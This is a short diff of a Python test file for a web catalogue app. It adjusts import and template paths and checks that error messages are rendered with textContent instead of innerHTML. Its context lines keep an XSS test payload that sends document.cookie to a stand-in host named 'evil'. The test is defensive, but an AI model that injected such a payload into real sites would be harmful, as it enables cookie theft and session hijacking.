@@ -19,7 +19,7 @@ os.environ.pop('SSH_HOST', None)
 import pytest
 
 from app import create_app
-from models import db, Producto
+from app.models import db, Producto
 
 PAYLOAD = "Cafe`;fetch('//evil/'+document.cookie);//${alert(1)}"
 
@@ -74,7 +74,7 @@ def test_catalogo_usa_textcontent_no_innerhtml_para_el_mensaje_de_error(client):
     # mostrarAlerta vive en catalogo.html, pero el bloque de scripts
     # extra se sirve solo en esa vista; probamos directo el archivo
     # fuente para no depender de tener sesion de cliente activa.
-    with open('templates/cliente/catalogo.html', encoding='utf-8') as f:
+    with open('app/templates/cliente/catalogo.html', encoding='utf-8') as f:
         js_source = f.read()
 
     assert 'texto.textContent = msg' in js_source
